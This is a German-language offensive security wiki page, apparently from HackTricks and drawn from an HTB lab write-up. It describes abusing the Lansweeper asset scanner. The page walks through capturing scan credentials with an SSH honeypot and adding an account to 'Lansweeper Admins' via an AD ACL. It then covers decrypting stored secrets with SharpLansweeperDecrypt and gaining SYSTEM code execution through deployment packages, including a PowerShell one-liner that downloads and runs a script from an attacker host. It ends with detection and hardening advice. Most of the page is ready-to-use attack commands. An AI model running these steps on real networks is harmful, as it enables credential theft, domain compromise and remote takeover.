# Lansweeper Abuse: Credential Harvesting, Secrets Decryption und Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper ist eine Plattform zur Erkennung und Inventarisierung von IT-Assets, die häufig unter Windows eingesetzt und in Active Directory integriert wird. In Lansweeper konfigurierte Zugangsdaten werden von den Scan-Engines verwendet, um sich über Protokolle wie SSH, SMB/WMI und WinRM bei Assets zu authentifizieren. Fehlkonfigurationen ermöglichen häufig:

- Das Abfangen von Zugangsdaten, indem ein Scan-Ziel auf einen vom Angreifer kontrollierten Host (Honeypot) umgeleitet wird
- Den Missbrauch von durch Lansweeper-bezogenen Gruppen offengelegten AD ACLs, um Remotezugriff zu erlangen
- Die Entschlüsselung von auf dem Host konfigurierten Lansweeper-Secrets (Connection Strings und gespeicherte Scan-Zugangsdaten)
- Codeausführung auf verwalteten Endpoints über die Deployment-Funktion (häufig als SYSTEM)

Diese Seite fasst praktische Angreifer-Workflows und Befehle zusammen, um dieses Verhalten während Engagements auszunutzen.

## 1) Scan-Zugangsdaten über einen Honeypot abgreifen (SSH-Beispiel)

Idee: Erstelle ein Scanning Target, das auf deinen Host zeigt, und ordne ihm vorhandene Scanning Credentials zu. Wenn der Scan ausgeführt wird, versucht Lansweeper, sich mit diesen Zugangsdaten zu authentifizieren, und dein Honeypot fängt sie ab.<sup>[[1]](#references)</sup>

Übersicht der Schritte (Web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (oder Single IP) = deine VPN-IP
- Konfiguriere den SSH-Port auf etwas Erreichbares (z. B. 2022, wenn 22 blockiert ist)
- Deaktiviere den Zeitplan und plane, den Scan manuell auszulösen
- Scanning → Scanning Credentials → stelle sicher, dass Linux/SSH-Credentials vorhanden sind; ordne sie dem neuen Ziel zu (aktiviere bei Bedarf alle)
- Klicke beim Ziel auf „Scan now“
- Starte einen SSH-Honeypot und rufe den versuchten Benutzernamen/das Passwort ab

Beispiel mit sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.yaml
server:
listen_address: 0.0.0.0:2022
```

```bash
# Prefer a current release/container; the package in Debian-derived repositories may be stale
sshesame -config sshesame.yaml

# Or run the maintained container image
docker run --rm -it -p 2022:2022 \
-v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Erfasste Zugangsdaten gegen DC-Dienste validieren:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Hinweise
- Andere Protokolle sind nicht gleichwertig: Ein SMB/WinRM-Listener erhält normalerweise eine NTLM Challenge-Response und kein Klartextpasswort. Ob sie geknackt oder weitergeleitet werden kann, hängt von den ausgehandelten Protokollschutzmaßnahmen ab; siehe [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md). Die SSH-Passwortauthentifizierung ist normalerweise der einfachste Fall mit einem Klartextpasswort.
- Die SSH-Authentifizierung mit öffentlichem Schlüssel legt den Benutzernamen und den Fingerabdruck des öffentlichen Schlüssels gegenüber dem Server offen, **nicht** den privaten Schlüssel oder dessen Passphrase. Gewinnt die schlüsselbasierten Zugangsdaten vom kompromittierten Lansweeper-Server zurück, statt zu erwarten, dass ein Honeypot sie offenlegt.<sup>[[2]](#references)</sup>
- Viele Scanner identifizieren sich mit bestimmten Client-Bannern (z. B. RebexSSH) und versuchen harmlose Befehle (uname, whoami usw.).

### Die Reihenfolge der Auswahl von Zugangsdaten ist wichtig

Bei einem erneuten Scan versucht Lansweeper zuerst die Zugangsdaten erneut, die zuletzt für dieses Asset erfolgreich waren, danach die explizit zugeordneten Zugangsdaten in ihrer konfigurierten Reihenfolge und schließlich die globalen Zugangsdaten desselben Typs. Ein Honeypot, der die erste Passwortauthentifizierung akzeptiert, wird daher normalerweise keine späteren Fallback-Zugangsdaten beobachten; bei einer autorisierten Bewertung des Pfads der Zugangsdaten sollten Versuche protokolliert und abgelehnt werden, wenn das Ziel darin besteht, die vollständige Fallback-Reihenfolge zu überprüfen.<sup>[[6]](#references)</sup>

## 2) AD ACL abuse: Remotezugriff durch Hinzufügen zur App-Admin-Gruppe erlangen

Verwende BloodHound, um die effektiven Rechte des kompromittierten Kontos zu enumerieren. Eine häufige Feststellung ist eine scanner- oder app-spezifische Gruppe (z. B. „Lansweeper Discovery“), die GenericAll über eine privilegierte Gruppe (z. B. „Lansweeper Admins“) besitzt. Wenn die privilegierte Gruppe außerdem Mitglied von „Remote Management Users“ ist, wird WinRM verfügbar, sobald wir uns selbst hinzufügen.<sup>[[1]](#references)[[5]](#references)</sup>

Beispiele für die Sammlung:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
GenericAll auf einer Gruppe mit BloodyAD (Linux) ausnutzen:<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Dann erhalten Sie eine interaktive Shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Hinweis: Kerberos-Operationen sind zeitkritisch. Wenn KRB_AP_ERR_SKEW auftritt, synchronisiere zuerst mit dem DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Lansweeper-konfigurierte Secrets auf dem Host entschlüsseln

Auf dem Lansweeper-Server speichert die ASP.NET-Site typischerweise eine verschlüsselte Connection String sowie einen vom Anwendung verwendeten symmetrischen Schlüssel. Mit entsprechendem lokalem Zugriff können Sie den DB-Connection-String entschlüsseln und anschließend gespeicherte Scan-Credentials extrahieren.<sup>[[1]](#references)</sup>

Typische Speicherorte:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Anwendungsschlüssel: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Verwenden Sie SharpLansweeperDecrypt, um die Entschlüsselung und das Ausgeben gespeicherter Credentials zu automatisieren. Ohne Argumente entschlüsselt die aktuelle ausführbare Datei `web.config`, verbindet sich mit der Datenbank und gibt alle konfigurierten Scan-Credentials aus; `-e` unterstützt außerdem die Offline-/manuelle Entschlüsselung, wenn ein verschlüsselter Wert und die Schlüsseldatei bereits verfügbar sind:<sup>[[3]](#references)</sup>
```powershell
# Automatic: use the default web.config and Encryption.txt locations
.\SharpLansweeperDecrypt.exe

# Manual: decrypt one database value with an explicit key file
.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
-p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'

# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
```
Die erwarteten Ergebnisse enthalten Datenbankverbindungsdaten und im Klartext vorliegende Scan-Anmeldedaten, beispielsweise Windows- und Linux-Konten, die in der gesamten Umgebung verwendet werden. Diese verfügen auf Domänenhosts häufig über erweiterte lokale Rechte:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Verwende wiederhergestellte Windows-Scanning-Credentials für privilegierten Zugriff:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Als Mitglied der Gruppe „Lansweeper Admins“ bietet die Weboberfläche Zugriff auf Deployment und Configuration. Unter Deployment → Deployment packages können Sie Pakete erstellen, die beliebige Befehle auf den ausgewählten Assets ausführen. Lansweeper verwendet ein administratives Scanning-Credential, um auf den Task Scheduler und `C$` des Ziels zuzugreifen, und erstellt anschließend eine Aufgabe für das Deployment. Wenn das Paket den Ausführungsmodus **System Account** verwendet, wird die Payload als `NT AUTHORITY\SYSTEM` ausgeführt. Andere Ausführungsmodi können das zugeordnete Scanning-Credential oder den aktuell angemeldeten Benutzer verwenden. Überprüfen Sie daher den ausgewählten Modus, anstatt SYSTEM vorauszusetzen.<sup>[[1]](#references)[[7]](#references)</sup>

Übergeordnete Schritte:
- Erstellen Sie ein neues Deployment package, das einen PowerShell- oder cmd-Einzeiler ausführt (reverse shell, add-user usw.).
- Wählen Sie das gewünschte Asset als Ziel aus (z. B. den DC/Host, auf dem Lansweeper ausgeführt wird), und klicken Sie auf Deploy/Run now.
- Fangen Sie Ihre Shell als SYSTEM ab.

Beispiel-Payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment-Aktionen sind auffällig und hinterlassen Logs in Lansweeper und den Windows-Ereignisprotokollen. Gehen Sie damit umsichtig um.

### Deployment-Artefakte und ein zweiter Punkt für den Abfluss von Credentials

Der Scanner schreibt seine Deployment-Datei über `C$` nach `C:\Windows\LSDeployment`. Package-Dateien werden normalerweise aus `DefaultPackageShare$` gelesen, das durch `C:\Program Files (x86)\Lansweeper\PackageShare` bereitgestellt wird, oder aus einem IP-Range-spezifischen Package-Share. Wichtig ist, dass Lansweeper dokumentiert, dass das Package-Share-Credential **in reversibel verschlüsselter Form in der Registry jedes Computers gespeichert wird, der ein Deployment erhält**. Betrachten Sie einen kompromittierten verwalteten Endpoint als potenzielle Offenlegungsquelle für diesen Share-Account und untersuchen Sie beim Rekonstruieren von Lansweeper-Aktivitäten das Deployment-Verzeichnis, den Verlauf geplanter Tasks und die konfigurierten Package-Shares.<sup>[[7]](#references)</sup>

## Erkennung und Härtung

- Beschränken oder entfernen Sie anonyme SMB-Aufzählungen. Überwachen Sie auf RID cycling und ungewöhnlichen Zugriff auf Lansweeper-Shares.
- Egress-Kontrollen: Blockieren oder beschränken Sie ausgehendes SSH/SMB/WinRM von Scanner-Hosts strikt. Lösen Sie bei nicht standardmäßigen Ports (z. B. 2022) und ungewöhnlichen Client-Bannern wie Rebex einen Alert aus.
- Schützen Sie `Website\\web.config` und `Key\\Encryption.txt`. Lagern Sie Secrets in einen Vault aus und rotieren Sie sie bei einer Offenlegung. Ziehen Sie Service-Accounts mit minimalen Berechtigungen und, sofern möglich, gMSA in Betracht.
- AD-Überwachung: Lösen Sie bei Änderungen an Lansweeper-bezogenen Gruppen (z. B. „Lansweeper Admins“, „Remote Management Users“) sowie bei ACL-Änderungen, die GenericAll/Write-Mitgliedschaft für privilegierte Gruppen gewähren, einen Alert aus.
- Überwachen Sie die Erstellung, Änderung und Ausführung von Deployment-Packages und korrelieren Sie neue Remote Scheduled Tasks mit Schreibvorgängen nach `C:\Windows\LSDeployment`; lösen Sie bei Packages, die `cmd.exe`/`powershell.exe` starten, oder bei unerwarteten ausgehenden Verbindungen einen Alert aus.
- Gewähren Sie Package-Share-Credentials ausschließlich die Berechtigung **Read & Execute** und verwenden Sie sie niemals erneut für die Administration. Bevorzugen Sie, wo praktikabel, agentenbasiertes Inventory: Wenn alle Computer durch einen Agent gescannt werden und das Deployment-Modul ungenutzt bleibt, benötigt Lansweeper keine gespeicherten Computer-Scanning-Credentials.<sup>[[6]](#references)[[7]](#references)</sup>

## Verwandte Themen
- [SMB/LSA/SAMR-Aufzählung und RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
- [Kerberos-Authentifizierung und Überlegungen zu Clock Skew](kerberos-authentication.md)
- [BloodHound-Pfadanalyse](bloodhound.md)
- [WinRM-Nutzung und laterale Bewegung](../lateral-movement/winrm.md)



## References
- [1] [HTB: Sweep — Missbrauch von Lansweeper Scanning, AD-ACLs und Secrets zur Übernahme eines DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH-Honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [6] [Scanning-Credentials erstellen und zuordnen — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
- [7] [Deployment-Anforderungen — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
{{#include ../../banners/hacktricks-training.md}}
